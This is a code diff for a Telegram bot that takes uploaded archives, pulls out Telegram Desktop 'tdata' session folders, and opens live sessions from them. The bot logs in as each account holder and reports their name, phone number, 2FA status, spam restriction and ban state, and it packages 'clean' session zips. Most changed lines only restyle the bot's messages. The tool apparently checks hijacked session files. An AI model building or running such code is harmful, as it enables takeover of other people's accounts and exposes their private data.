@@ -227,45 +227,45 @@ from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError
 # from your_db_module import db
 
 
+
 @Client.on_message(filters.document)
 async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
     results = []
     try:
-        await message.reply("Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
+        await message.reply("🟢 Sᴛᴇᴘ 1: Sᴛᴀʀᴛɪɴɢ ᴘʀᴏᴄᴇssɪɴɢ...")
+
+        await message.reply("📥 Sᴛᴇᴘ 1.1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
         try:
             file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
-            await message.reply(f"✅ Step 1.2: File downloaded to `{file_path}`")
+            await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
         except Exception as e:
-            return await message.reply(f"❌ Step 1 (Download) failed: {e}")
+            return await message.reply(f"❌ Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")
 
         extract_dir = os.path.join(tempdir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
-        await message.reply(f"✅ Step 1.2: File downloaded to {file_path}")
+        await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
         await show_zip_structure(file_path, message, client)
 
         # --- Step 2: Extraction
-        await message.reply("📦 Step 2.1: Trying to extract archive...")
+        await message.reply("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
         try:
             with zipfile.ZipFile(file_path, "r") as zip_ref:
                 zip_ref.extractall(extract_dir)
-            await message.reply(f"✅ Step 2.2: ZIP extracted to `{extract_dir}`")
+            await message.reply(f"✅ Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
         except Exception as e_zip:
             try:
                 with rarfile.RarFile(file_path, "r") as rar_ref:
                     rar_ref.extractall(extract_dir)
-                await message.reply(f"✅ Step 2.3: RAR extracted to `{extract_dir}`")
+                await message.reply(f"✅ Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
             except Exception as e_rar:
                 return await message.reply(
-                    f"❌ Step 2 (Extraction) failed.\n"
-                    f"ZIP error: {e_zip}\nRAR error: {e_rar}"
+                    f"❌ Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
+                    f"Zɪᴘ ᴇʀʀᴏʀ: {e_zip}\nRᴀʀ ᴇʀʀᴏʀ: {e_rar}"
                 )
 
-      
-
-                # --- Step 3: Detect or Build tdata
-                # --- Step 3: Detect or Build tdata
-        await message.reply("🔍 Step 3: Searching / building `tdata`...")
+        # --- Step 3: Detect or Build tdata
+        await message.reply("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
 
         tdata_paths = []
 
@@ -276,11 +276,9 @@ async def handle_archive(client, message):
                        any(d in ("key_data", "key_1") for d in dirs)
 
             if has_d877 and has_keys:
-                # Treat this folder as a valid tdata, regardless of name
                 tdata_paths.append(root)
-                await message.reply(f"🔎 Found valid tdata folder: {root}")
+                await message.reply(f"🔎 Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")
 
-            # Case: only D877F but no key_data — still try to wrap
             elif has_d877:
                 fake_tdata = os.path.join(root, "tdata")
                 os.makedirs(fake_tdata, exist_ok=True)
@@ -289,13 +287,12 @@ async def handle_archive(client, message):
                         shutil.move(os.path.join(root, item),
                                     os.path.join(fake_tdata, item))
                 tdata_paths.append(fake_tdata)
-                await message.reply(f"🔧 Built fake tdata at: {fake_tdata}")
+                await message.reply(f"🔧 Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
 
-            # Case: inner RARs remain the same
             for f in files:
                 if f.lower().endswith(".rar"):
                     rar_path = os.path.join(root, f)
-                    await message.reply(f"📂 Found inner RAR: {rar_path}")
+                    await message.reply(f"📂 Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
                     try:
                         rar_extract_dir = os.path.join(root, "rar_extracted")
                         os.makedirs(rar_extract_dir, exist_ok=True)
@@ -306,47 +303,44 @@ async def handle_archive(client, message):
                             has_keys_rar = any(x in ("key_data", "key_1") for x in f2 + d2)
                             if has_d877_rar and has_keys_rar:
                                 tdata_paths.append(r2)
-                                await message.reply(f"🔎 Extracted inner RAR tdata: {r2}")
+                                await message.reply(f"🔎 Exᴛʀᴀᴄᴛᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴛᴅᴀᴛᴀ: {r2}")
                     except Exception as e:
-                        await message.reply(f"⚠️ Failed to extract inner rar: {e}")
+                        await message.reply(f"⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ɪɴɴᴇʀ Rᴀʀ: {e}")
                         fake_tdata = os.path.join(root, "tdata")
                         os.makedirs(fake_tdata, exist_ok=True)
                         shutil.copy(rar_path, os.path.join(fake_tdata, os.path.basename(rar_path)))
                         tdata_paths.append(fake_tdata)
-                        await message.reply(f"🔧 Wrapped inner rar as fake tdata at: {fake_tdata}")
+                        await message.reply(f"🔧 Wʀᴀᴘᴘᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴀs ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
 
         if not tdata_paths:
-            return await message.reply("⚠️ No `tdata` folders detected in this archive.")
+            return await message.reply("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")
 
-        # --- Step 4: Process tdata (UNCHANGED)
+        # --- Step 4: Process tdata
         start_num = await db.get_next_account_num()
         for offset, tdata_path in enumerate(tdata_paths, 1):
             idx = start_num + offset
-            await message.reply(f"➡️ Step 4.{idx}: Processing tdata at `{tdata_path}`")
+            await message.reply(f"➡️ Sᴛᴇᴘ 4.{idx}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
             try:
                 await show_tdata_structure_and_rar(tdata_path, message)
                 
                 tdesk = TDesktop(tdata_path)
                 if not tdesk.isLoaded():
-                    results.append(f"#{idx} ⚠️ Failed to load (corrupted tdata)")
+                    results.append(f"#{idx} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                     continue
-                await message.reply(f"✅ Loaded tdata #{idx}")
+                await message.reply(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{idx}")
 
                 tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                 await tele_client.connect()
-                await message.reply(f"📡 Connected Telethon client for tdata #{idx}")
+                await message.reply(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{idx}")
 
                 if not await tele_client.is_user_authorized():
-                    results.append(f"#{idx} ⚠️ Not authorized (needs login / 2FA)")
-                    await message.reply(f"⚠️ tdata #{idx} not authorized")
+                    results.append(f"#{idx} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
+                    await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{idx} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
                     continue
 
                 me = await tele_client.get_me()
-                await message.reply(f"👤 Logged in as {me.first_name or '?'} ({me.id})")
+                await message.reply(f"👤 Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
 
-                # 2FA check
-                
-                # Save clean zip
                 clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                 with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                     for root, dirs, files in os.walk(tdata_path):
@@ -372,37 +366,38 @@ async def handle_archive(client, message):
 
                 results.append(
                     f"#{idx}\n"
-                    f"Account Name: {info['name']}\n"
-                    f"Phone Number: {info['phone']}\n"
+                    f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
+                    f"Pʜᴏɴᴇ Nᴜᴍʙᴇʀ: {info['phone']}\n"
                     f"{info['twofa']}\n"
-                    f"Spam Mute: {info['spam']}\n"
+                    f"Sᴘᴀᴍ Mᴜᴛᴇ: {info['spam']}\n"
                 )
 
                 await tele_client.disconnect()
-                await message.reply(f"✅ Finished processing account #{idx}")
+                await message.reply(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{idx}")
 
             except SessionPasswordNeededError:
-                results.append(f"#{idx} ❌ 2FA: Enabled (password required)")
-                await message.reply(f"❌ tdata #{idx}: Needs 2FA password")
+                results.append(f"#{idx} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
+                await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{idx}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
             except PhoneNumberBannedError:
-                results.append(f"#{idx} 🚫 BANNED number")
-                await message.reply(f"🚫 tdata #{idx}: Banned account")
+                results.append(f"#{idx} 🚫 Bᴀɴɴᴇᴅ ɴᴜᴍʙᴇʀ")
+                await message.reply(f"🚫 ᴛᴅᴀᴛᴀ #{idx}: Bᴀɴɴᴇᴅ ᴀᴄᴄᴏᴜɴᴛ")
             except Exception as e:
-                results.append(f"#{idx} ❌ Error: {str(e)}")
-                await message.reply(f"❌ Error in Step 4.{idx}: {e}")
+                results.append(f"#{idx} ❌ Eʀʀᴏʀ: {str(e)}")
+                await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{idx}: {e}")
 
         # --- Final Report
-        report_text = "📑 Final Report:\n\n" + "\n".join(results)
+        report_text = "📑 Fɪɴᴀʟ Rᴇᴘᴏʀᴛ:\n\n" + "\n".join(results)
         report_path = os.path.join(tempdir, "report.txt")
         with open(report_path, "w") as f:
             f.write(report_text)
 
-        await message.reply_document(report_path, caption="✅ Report generated")
+        await message.reply_document(report_path, caption="✅ Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ")
 
     except Exception as e:
-        await message.reply(f"❌ Top-level error: {e}")
+        await message.reply(f"❌ Tᴏᴘ-ʟᴇᴠᴇʟ ᴇʀʀᴏʀ: {e}")
     finally:
         shutil.rmtree(tempdir, ignore_errors=True)
+
 
 
 
